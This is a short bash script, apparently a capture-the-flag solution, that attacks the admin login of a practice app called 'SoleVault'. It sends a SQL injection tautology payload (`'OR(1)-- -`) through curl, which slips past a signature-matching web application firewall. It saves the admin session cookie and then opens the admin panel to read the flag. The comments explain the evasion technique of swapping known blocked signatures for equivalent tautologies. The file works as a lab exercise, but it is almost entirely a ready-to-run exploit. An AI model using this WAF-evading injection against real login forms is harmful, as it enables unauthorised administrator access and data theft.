#!/usr/bin/env bash
# SoleVault — WAF-evading SQL injection on the admin login.
#
# The login is injectable, but "SoleVault Shield" blocks the famous tautology
# signatures (e.g. `OR 1=1`). The WAF matches strings, not SQL meaning, so an
# equivalent tautology that avoids the known signature — `OR(1)` or `OR 0=0` —
# sails through and logs us in as the first user (the administrator).
set -euo pipefail
BASE="http://sole.136.82.117.70.nip.io"

# 1) Log in with the signature-free tautology; save the admin session cookie.
curl -i -c cookies.txt \
  --data-urlencode "username='OR(1)-- -" \
  --data-urlencode "password=x" \
  "$BASE/admin"
# -> HTTP/1.1 302 FOUND, Location: /admin/panel, Set-Cookie: sv_admin=...

# 2) Visit the admin panel with the session cookie; the flag is in the
#    "Regulatory - Compliance asset #7" card.
curl -b cookies.txt "$BASE/admin/panel"
